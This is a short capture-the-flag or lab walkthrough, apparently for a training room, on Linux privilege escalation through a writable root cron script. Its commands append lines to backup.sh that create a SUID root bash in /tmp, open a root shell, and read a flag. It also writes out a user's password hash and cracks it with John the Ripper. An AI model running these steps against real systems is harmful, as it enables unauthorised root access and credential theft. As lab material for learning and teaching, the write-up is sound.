# Cron Job Privilege Escalation

## Step 1: User & Permission Enumeration

First, identify the current user and check available sudo permissions.

```bash
whoami
id
sudo -l
```

## Step 2: Cron Job Enumeration

Since sudo access is unavailable, inspect the system cron configuration for scheduled tasks running as root.

```bash
cat /etc/crontab
```

**Finding:** Interesting root-owned scheduled scripts were discovered:

```text
root /home/karen/backup.sh
root /antivirus.sh
root /tmp/test.py
```

## Step 3: Check PATH & File Permissions

Inspect the cron PATH and check the permissions of the scheduled scripts.

```bash
grep PATH /etc/crontab
ls -ld /usr/local/sbin /usr/local/bin /sbin /bin /usr/sbin /usr/bin
ls -la /tmp/test.py
ls -la /home/karen/backup.sh
```

**Hint:** Check whether a normal user can modify a script that runs automatically with root privileges.

## Step 4: Modify the Writable Cron Script

Append commands to create a SUID-enabled Bash binary.

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /home/karen/backup.sh
```

Check the modified script:

```bash
cat /home/karen/backup.sh
```

## Step 5: Obtain Root Access

Make sure the script is executable:

```bash
chmod +x /home/karen/backup.sh
```

Wait for the root cron job to execute, then check:

```bash
ls -l /tmp/rootbash
```

Launch the SUID Bash shell:

```bash
/tmp/rootbash -p
```

Verify privileges:

```bash
id
```

Read the flag:

```bash
cat /home/ubuntu/flag5.txt
```

## Step 6: Find & Crack Matt's Password Hash

Search for information related to the user `matt`.

```bash
grep -Ri "matt" /home /var/backups /etc 2>/dev/null
```

Save the discovered password hash:

```bash
echo 'matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' > matt_hash.txt
```

Crack using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt matt_hash.txt
```

## Technique

- **Category:** Linux Privilege Escalation
- **Method:** Cron Job Misconfiguration
- **Vulnerable Script:** `/home/karen/backup.sh`
- **Privilege:** Root
- **Tool:** John the Ripper
